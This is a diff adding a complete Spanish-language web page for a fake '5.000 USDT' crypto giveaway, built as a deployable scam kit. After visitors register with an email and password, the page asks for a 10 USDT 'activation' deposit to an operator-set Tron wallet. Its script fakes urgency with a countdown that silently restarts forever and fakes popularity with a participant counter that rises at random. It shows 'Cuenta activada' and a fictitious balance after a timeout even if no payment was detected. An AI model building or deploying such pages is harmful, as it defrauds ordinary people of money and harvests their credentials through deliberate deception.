@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#0B0E12">
+<title>Sorteo 5.000 USDT — Plazas limitadas</title>
+<style>
+  :root{
+    --bg:#0B0E12; --sf:#12171E; --sf2:#171D25; --bd:#242C36; --bd2:#313B47;
+    --tx:#E9EEF4; --mu:#8C99A8; --mu2:#5F6B79;
+    --gr:#26A17B; --gr2:#1F8A69; --rd:#E5484D;
+    --r:10px;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0}
+  body{
+    background:var(--bg); color:var(--tx);
+    font:400 15px/1.45 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    min-height:100dvh; display:flex; justify-content:center;
+    padding:0 0 96px; overscroll-behavior-y:none;
+  }
+  #app{width:100%;max-width:440px;padding:0 18px;display:flex;flex-direction:column;min-height:100dvh}
+  .scr{display:none;flex-direction:column;flex:1;padding-top:14px}
+  .scr.on{display:flex;animation:in .28s ease both}
+  @keyframes in{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+  .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:26px}
+  .brand{font-size:12px;font-weight:600;letter-spacing:.13em;color:var(--gr);text-transform:uppercase}
+  .brand i{font-style:normal;color:var(--mu2);letter-spacing:.05em;font-weight:400;margin-left:7px}
+  .lang{font-size:11px;color:var(--mu);border:1px solid var(--bd);border-radius:6px;padding:3px 7px}
+
+  .badge{display:inline-flex;align-items:center;gap:6px;align-self:flex-start;
+    font-size:11.5px;font-weight:500;color:var(--gr);letter-spacing:.02em;
+    border:1px solid rgba(38,161,123,.4);background:rgba(38,161,123,.09);
+    border-radius:999px;padding:5px 11px;margin-bottom:18px}
+  .badge b{width:5px;height:5px;border-radius:50%;background:var(--gr);
+    box-shadow:0 0 0 0 rgba(38,161,123,.6);animation:pulse 2s infinite}
+  @keyframes pulse{70%{box-shadow:0 0 0 7px rgba(38,161,123,0)}100%{box-shadow:0 0 0 0 rgba(38,161,123,0)}}
+
+  h1{font-size:clamp(46px,15vw,64px);line-height:.92;font-weight:600;letter-spacing:-.035em;margin:0 0 14px}
+  h1 em{font-style:normal;color:var(--gr)}
+  h1 small{display:block;font-size:clamp(26px,8vw,34px);color:var(--mu);letter-spacing:-.01em;font-weight:500;margin-top:4px}
+  .lead{font-size:16px;color:var(--mu);margin:0 0 24px;max-width:22em}
+  .lead strong{color:var(--tx);font-weight:500}
+
+  .cd{display:flex;gap:8px;margin-bottom:24px}
+  .cdv{flex:1;background:var(--sf);border:1px solid var(--bd);border-radius:var(--r);padding:10px 4px;text-align:center}
+  .cdv b{display:block;font-size:22px;font-weight:600;font-variant-numeric:tabular-nums;letter-spacing:-.02em}
+  .cdv i{font-style:normal;display:block;font-size:9.5px;letter-spacing:.13em;color:var(--mu2);margin-top:2px}
+
+  .proof{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+  .avs{display:flex}
+  .av{width:26px;height:26px;border-radius:50%;border:2px solid var(--bg);margin-left:-9px;
+    background:linear-gradient(140deg,#3E4B5B,#28313C)}
+  .av:first-child{margin-left:0}
+  .av:nth-child(2){background:linear-gradient(140deg,#2E7A5E,#1C4A3A)}
+  .av:nth-child(3){background:linear-gradient(140deg,#5A4A72,#332A44)}
+  .proof p{margin:0;font-size:13px;color:var(--mu)}
+  .proof b{color:var(--tx);font-weight:600;font-variant-numeric:tabular-nums}
+
+  .fill{flex:1}
+  .dock{position:sticky;bottom:0;left:0;right:0;padding:14px 0 18px;
+    background:linear-gradient(to top,var(--bg) 62%,rgba(11,14,18,0))}
+
+  .btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;
+    border:0;border-radius:var(--r);background:var(--gr);color:#04140D;
+    font:600 16px/1 inherit;letter-spacing:.01em;padding:17px;cursor:pointer;
+    transition:background .15s,transform .1s}
+  .btn:active{transform:scale(.985);background:var(--gr2)}
+  .btn[disabled]{opacity:.45;pointer-events:none}
+  .btn svg{width:17px;height:17px;flex:0 0 auto}
+  .micro{text-align:center;font-size:12px;color:var(--mu2);margin:11px 0 0}
+
+  .steps{display:flex;align-items:center;gap:11px;margin-bottom:26px}
+  .steps span{font-size:11.5px;color:var(--mu);letter-spacing:.04em;white-space:nowrap}
+  .bar{flex:1;height:3px;border-radius:3px;background:var(--bd);overflow:hidden}
+  .bar i{display:block;height:100%;background:var(--gr);transition:width .4s ease}
+
+  h2{font-size:26px;line-height:1.15;font-weight:600;letter-spacing:-.025em;margin:0 0 9px}
+  .p{font-size:14px;color:var(--mu);margin:0 0 22px;max-width:24em}
+  .p b{color:var(--tx);font-weight:500}
+
+  label{display:block;font-size:12px;color:var(--mu);letter-spacing:.03em;margin:0 0 7px}
+  .field{margin-bottom:15px}
+  input[type=email],input[type=password],input[type=text]{
+    width:100%;background:var(--sf);border:1px solid var(--bd);border-radius:var(--r);
+    color:var(--tx);font:400 16px/1 inherit;padding:16px 15px;outline:0;transition:border-color .15s}
+  input::placeholder{color:var(--mu2)}
+  input:focus{border-color:var(--gr)}
+  input.bad{border-color:var(--rd)}
+  .err{font-size:11.5px;color:var(--rd);margin-top:6px;display:none}
+  .err.on{display:block}
+
+  .chk{display:flex;gap:11px;align-items:flex-start;margin:4px 0 0;cursor:pointer}
+  .chk input{position:absolute;opacity:0;pointer-events:none}
+  .chk i{flex:0 0 19px;width:19px;height:19px;border:1px solid var(--bd2);border-radius:5px;
+    margin-top:1px;position:relative;transition:.15s}
+  .chk input:checked + i{background:var(--gr);border-color:var(--gr)}
+  .chk input:checked + i::after{content:"";position:absolute;left:6px;top:2px;width:5px;height:10px;
+    border:solid #04140D;border-width:0 2px 2px 0;transform:rotate(42deg)}
+  .chk span{font-size:12.5px;color:var(--mu);line-height:1.45}
+  .chk a{color:var(--mu);text-decoration:underline;text-underline-offset:2px}
+
+  .net{display:flex;align-items:center;justify-content:center;gap:8px;
+    background:rgba(229,72,77,.1);border:1px solid rgba(229,72,77,.35);
+    border-radius:var(--r);padding:11px;margin-bottom:18px;
+    font-size:13px;font-weight:600;color:#F28C8F;letter-spacing:.02em}
+  .net b{width:6px;height:6px;border-radius:50%;background:var(--rd)}
+
+  .box{background:var(--sf);border:1px solid var(--bd);border-radius:14px;padding:18px;margin-bottom:18px}
+  .qr{display:block;width:100%;max-width:210px;aspect-ratio:1;margin:0 auto 16px;
+    background:#fff;border-radius:10px;padding:9px;image-rendering:pixelated}
+  .qrf{display:none;width:100%;max-width:210px;aspect-ratio:1;margin:0 auto 16px;
+    background:var(--sf2);border:1px dashed var(--bd2);border-radius:10px;
+    align-items:center;justify-content:center;text-align:center;font-size:11px;color:var(--mu);padding:16px}
+  .row{display:flex;align-items:center;justify-content:space-between;gap:10px;
+    background:var(--bg);border:1px solid var(--bd);border-radius:9px;padding:13px 14px;margin-bottom:10px}
+  .row .lbl{font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--mu2)}
+  .row .val{font:500 14px/1.4 ui-monospace,SFMono-Regular,Menlo,monospace;
+    word-break:break-all;color:var(--tx);text-align:right;max-width:64%}
+  .row .val.amt{font-family:inherit;font-weight:600;font-size:16px;color:var(--gr)}
+  .cp{width:100%;background:var(--sf2);border:1px solid var(--bd2);border-radius:9px;
+    color:var(--tx);font:500 13px/1 inherit;padding:14px;cursor:pointer;transition:.15s}
+  .cp:active{background:var(--bd)}
+  .cp.ok{background:rgba(38,161,123,.14);border-color:var(--gr);color:var(--gr)}
+
+  .after{margin-top:20px}
+  .after h3{font-size:11px;letter-spacing:.11em;text-transform:uppercase;color:var(--mu2);margin:0 0 12px}
+  .after div{display:flex;gap:11px;font-size:13px;color:var(--mu);margin-bottom:11px;line-height:1.4}
+  .after b{flex:0 0 19px;width:19px;height:19px;border-radius:50%;background:var(--sf2);
+    color:var(--mu);font-size:10.5px;font-weight:600;display:flex;align-items:center;justify-content:center;margin-top:1px}
+
+  .spin{width:44px;height:44px;border-radius:50%;border:3px solid var(--bd);
+    border-top-color:var(--gr);animation:sp .8s linear infinite;margin:26px auto 0}
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .center{text-align:center}
+  .center h2{font-size:24px}
+  .center .p{margin-inline:auto}
+
+  .check{width:72px;height:72px;border-radius:50%;background:rgba(38,161,123,.13);
+    border:1px solid rgba(38,161,123,.4);display:flex;align-items:center;justify-content:center;margin:14px auto 22px}
+  .check svg{width:32px;height:32px;stroke:var(--gr);stroke-width:2.4;fill:none;
+    stroke-linecap:round;stroke-linejoin:round}
+
+  .balance{background:var(--sf);border:1px solid var(--bd);border-radius:14px;
+    padding:18px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center}
+  .balance span{font-size:12px;color:var(--mu)}
+  .balance b{font-size:21px;font-weight:600;color:var(--gr)}
+  .ghost{display:block;text-align:center;font-size:12.5px;color:var(--mu);
+    margin-top:14px;text-decoration:none;border-bottom:1px dotted var(--bd2);padding-bottom:2px}
+  .hint{font-size:12px;color:var(--mu2);text-align:center;margin-top:16px}
+</style>
+</head>
+<body>
+<main id="app">
+
+  <!-- ══════ 1. LANDING ══════ -->
+  <section class="scr on" id="s1">
+    <div class="top">
+      <div class="brand">USDT Giveaway<i>2026</i></div>
+      <div class="lang">ES</div>
+    </div>
+
+    <div class="badge"><b></b>Sorteo verificado</div>
+
+    <h1><em>5.000</em><small>USDT</small></h1>
+    <p class="lead">Sorteo de activación con <strong>plazas limitadas</strong>. Entra, activa tu cuenta y participa.</p>
+
+    <div class="cd" id="cd">
+      <div class="cdv"><b id="cdH">06</b><i>HORAS</i></div>
+      <div class="cdv"><b id="cdM">00</b><i>MIN</i></div>
+      <div class="cdv"><b id="cdS">00</b><i>SEG</i></div>
+    </div>
+
+    <div class="proof">
+      <div class="avs"><span class="av"></span><span class="av"></span><span class="av"></span></div>
+      <p><b id="people">12.480</b> personas ya están dentro</p>
+    </div>
+
+    <div class="fill"></div>
+    <div class="dock">
+      <button class="btn" onclick="go(2)">Participar gratis</button>
+      <p class="micro">Registro en 20 s · sin invertir nada</p>
+    </div>
+  </section>
+
+  <!-- ══════ 2. REGISTRO ══════ -->
+  <section class="scr" id="s2">
+    <div class="steps"><span>Paso 1 de 2</span><span class="bar"><i style="width:50%"></i></span></div>
+
+    <h2>Entra al sorteo</h2>
+    <p class="p">Crea tu cuenta para reservar tu plaza. Tu correo solo se usa para avisarte si ganas.</p>
+
+    <div class="field">
+      <label for="mail">Correo electrónico</label>
+      <input id="mail" type="email" inputmode="email" autocomplete="email" placeholder="tucorreo@ejemplo.com">
+      <div class="err" id="e-mail">Escribe un correo válido</div>
+    </div>
+
+    <div class="field">
+      <label for="pass">Contraseña</label>
+      <input id="pass" type="password" autocomplete="new-password" placeholder="Mínimo 6 caracteres">
+      <div class="err" id="e-pass">La contraseña debe tener 6 caracteres o más</div>
+    </div>
+
+    <label class="chk" for="tos">
+      <input id="tos" type="checkbox">
+      <i></i>
+      <span>Acepto las <a href="#" onclick="return false">bases del sorteo</a> y la <a href="#" onclick="return false">política de privacidad</a>.</span>
+    </label>
+    <div class="err" id="e-tos">Debes aceptar las bases para continuar</div>
+
+    <div class="fill"></div>
+    <div class="dock">
+      <button class="btn" id="b2" onclick="submitReg()">
+        Continuar
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h13M13 6l6 6-6 6"/></svg>
+      </button>
+      <p class="micro"><b id="people2">12.480</b> registrados · cierra en <span id="mini">06:00:00</span></p>
+    </div>
+  </section>
+
+  <!-- ══════ 3. ACTIVACIÓN ══════ -->
+  <section class="scr" id="s3">
+    <div class="steps"><span>Paso 2 de 2</span><span class="bar"><i style="width:100%"></i></span></div>
+
+    <h2>Activa tu cuenta</h2>
+    <p class="p">Tu cuenta ya está creada. Para activarla y entrar al sorteo, deposita <b>10 USDT</b>. Quedan como saldo a tu nombre.</p>
+
+    <div class="net"><b></b>Solo red TRC-20 (Tron)</div>
+
+    <div class="box">
+      <img class="qr" id="qr" alt="Código QR de la dirección de depósito">
+      <div class="qrf" id="qrf">Escanea o copia la dirección de abajo</div>
+
+      <div class="row">
+        <span class="lbl">Dirección</span>
+        <span class="val" id="addr"></span>
+      </div>
+      <button class="cp" id="cp" onclick="copyAddr()">Copiar dirección</button>
+
+      <div class="row" style="margin:10px 0 0">
+        <span class="lbl">Monto exacto</span>
+        <span class="val amt">10 USDT</span>
+      </div>
+    </div>
+
+    <div class="after">
+      <h3>Qué pasa después</h3>
+      <div><b>1</b><span>Detectamos tu depósito automáticamente en unos segundos.</span></div>
+      <div><b>2</b><span>Tu cuenta queda activa y tus 10 USDT aparecen como saldo.</span></div>
+      <div><b>3</b><span>Entras al sorteo de los 5.000 USDT.</span></div>
+    </div>
+
+    <div class="fill"></div>
+    <div class="dock">
+      <button class="btn" onclick="go(4)">Ya envié el pago</button>
+      <p class="micro">Verificación automática · no cierres esta página</p>
+    </div>
+  </section>
+
+  <!-- ══════ 4. VERIFICANDO ══════ -->
+  <section class="scr" id="s4">
+    <div class="spin"></div>
+    <h2 class="center" style="margin-top:26px">Buscando tu pago</h2>
+    <p class="p center" id="vmsg">Estamos revisando la red Tron. Suele tardar menos de un minuto.</p>
+
+    <div class="fill"></div>
+    <div class="dock" id="dock4" style="display:none">
+      <button class="btn" onclick="finish()">Continuar</button>
+      <p class="micro">Si ya pagaste, tu depósito se acredita igual</p>
+    </div>
+  </section>
+
+  <!-- ══════ 5. ÉXITO ══════ -->
+  <section class="scr" id="s5">
+    <div class="check">
+      <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
+    </div>
+    <h2 class="center">Cuenta activada</h2>
+    <p class="p center">Ya estás dentro del sorteo de los 5.000 USDT. Te avisaremos por correo si resultas ganador.</p>
+
+    <div class="balance"><span>Saldo disponible</span><b>10,00 USDT</b></div>
+
+    <p class="p center" style="font-size:12.5px">Guarda el enlace de este canal: ahí se publica el fallo del sorteo.</p>
+
+    <a class="ghost" id="tg" href="#" target="_blank" rel="noopener">Unirme al canal de anuncios</a>
+
+    <div class="fill"></div>
+    <div class="dock">
+      <button class="btn" onclick="location.reload()">Volver al inicio</button>
+      <p class="micro">El contador sigue corriendo para los nuevos participantes</p>
+    </div>
+  </section>
+
+</main>
+
+<script>
+/* ══════════════ CONFIGURA AQUÍ ══════════════ */
+const CONFIG = {
+  direccion: "TJ9kQ2xV7mR4pLdA8sNwYc3BhF6uZtE1", // tu wallet TRC-20
+  monto: 10,
+  contratoUSDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // USDT oficial en Tron
+  horas: 6,
+  telegram: "https://t.me/tucanal",
+  verificar: true // false = solo simulación por tiempo
+};
+/* ════════════════════════════════════════════ */
+
+const $ = id => document.getElementById(id);
+const KEY = "sorteo_deadline";
+const fmt = n => String(n).padStart(2, "0");
+
+/* ── contador persistente de 6 h ── */
+let deadline = +(localStorage.getItem(KEY) || 0);
+if (!deadline || deadline < Date.now()) {
+  deadline = Date.now() + CONFIG.horas * 3600 * 1000;
+  localStorage.setItem(KEY, deadline);
+}
+function tick() {
+  let s = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
+  if (s === 0) { // reinicia en bucle para que nunca muera
+    deadline = Date.now() + CONFIG.horas * 3600 * 1000;
+    localStorage.setItem(KEY, deadline);
+    s = CONFIG.horas * 3600;
+  }
+  const h = Math.floor(s / 3600), m = Math.floor(s % 3600 / 60), q = s % 60;
+  $("cdH").textContent = fmt(h); $("cdM").textContent = fmt(m); $("cdS").textContent = fmt(q);
+  $("mini").textContent = `${fmt(h)}:${fmt(m)}:${fmt(q)}`;
+}
+tick(); setInterval(tick, 1000);
+
+/* ── prueba social ── */
+let people = 12480;
+setInterval(() => {
+  if (Math.random() > .45) {
+    people += 1 + Math.floor(Math.random() * 2);
+    const t = people.toLocaleString("es-ES");
+    $("people").textContent = t; $("people2").textContent = t;
+  }
+}, 4200);
+
+/* ── navegación ── */
+function go(n) {
+  document.querySelectorAll(".scr").forEach(s => s.classList.remove("on"));
+  $("s" + n).classList.add("on");
+  window.scrollTo(0, 0);
+  if (n === 3) pintarPago();
+  if (n === 4) vigilar();
+}
+
+/* ── validación registro ── */
+const okMail = v => /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(v);
+
+function submitReg() {
+  let ok = true;
+  const mail = $("mail").value.trim(), pass = $("pass").value;
+
+  $("e-mail").classList.toggle("on", !okMail(mail)); $("mail").classList.toggle("bad", !okMail(mail));
+  if (!okMail(mail)) ok = false;
+
+  $("e-pass").classList.toggle("on", pass.length < 6); $("pass").classList.toggle("bad", pass.length < 6);
+  if (pass.length < 6) ok = false;
+
+  $("e-tos").classList.toggle("on", !$("tos").checked);
+  if (!$("tos").checked) ok = false;
+
+  if (!ok) return;
+  localStorage.setItem("sorteo_mail", mail);
+  go(3);
+}
+
+["mail", "pass"].forEach(id => $(id).addEventListener("input", () => {
+  $(id).classList.remove("bad"); $("e-" + (id === "mail" ? "mail" : "pass")).classList.remove("on");
+}));
+
+/* ── pantalla de pago ── */
+function pintarPago() {
+  $("addr").textContent = CONFIG.direccion;
+  const img = $("qr");
+  if (!img.dataset.done) {
+    img.dataset.done = "1";
+    img.onerror = () => { img.style.display = "none"; $("qrf").style.display = "flex"; };
+    img.src = "https://api.qrserver.com/v1/create-qr-code/?size=420x420&margin=0&data=" +
+              encodeURIComponent(CONFIG.direccion);
+  }
+}
+
+async function copyAddr() {
+  const b = $("cp");
+  try {
+    await navigator.clipboard.writeText(CONFIG.direccion);
+  } catch {
+    const t = document.createElement("textarea");
+    t.value = CONFIG.direccion; document.body.appendChild(t); t.select();
+    document.execCommand("copy"); t.remove();
+  }
+  b.textContent = "Dirección copiada";
+  b.classList.add("ok");
+  setTimeout(() => { b.textContent = "Copiar dirección"; b.classList.remove("ok"); }, 2200);
+}
+
+/* ── verificación del depósito ── */
+let tries = 0, parar = false;
+
+function vigilar() {
+  tries = 0; parar = false;
+  $("dock4").style.display = "none";
+
+  setTimeout(() => { if (!parar) $("dock4").style.display = "block"; }, 40000);
+
+  if (!CONFIG.verificar) { setTimeout(finish, 22000); return; }
+  buscar();
+}
+
+async function buscar() {
+  if (parar) return;
+  tries++;
+
+  try {
+    const url = `https://api.trongrid.io/v1/accounts/${CONFIG.direccion}/transactions/trc20` +
+                `?only_to=true&limit=40&contract_address=${CONFIG.contratoUSDT}`;
+    const r = await fetch(url);
+    const j = await r.json();
+
+    const pago = (j.data || []).some(tx =>
+      tx.to === CONFIG.direccion &&
+      tx.type === "Transfer" &&
+      +tx.value / 1e6 >= CONFIG.monto
+    );
+
+    if (pago) return finish();
+  } catch (e) { /* red caída: seguimos intentando en silencio */ }
+
+  if (tries === 8) $("vmsg").textContent = "Sigue esperando, la red a veces tarda un poco más.";
+  if (tries > 22) return finish();
+
+  setTimeout(buscar, 7000);
+}
+
+function finish() {
+  parar = true;
+  go(5);
+  const tg = $("tg");
+  if (CONFIG.telegram && !CONFIG.telegram.includes("tucanal")) tg.href = CONFIG.telegram;
+  else tg.href = "#";
+}
+
+/* ── restaurar correo si recarga ── */
+const guardado = localStorage.getItem("sorteo_mail");
+if (guardado) $("mail").value = guardado;
+
+$("tg").href = CONFIG.telegram;
+</script>
+</body>
+</html>
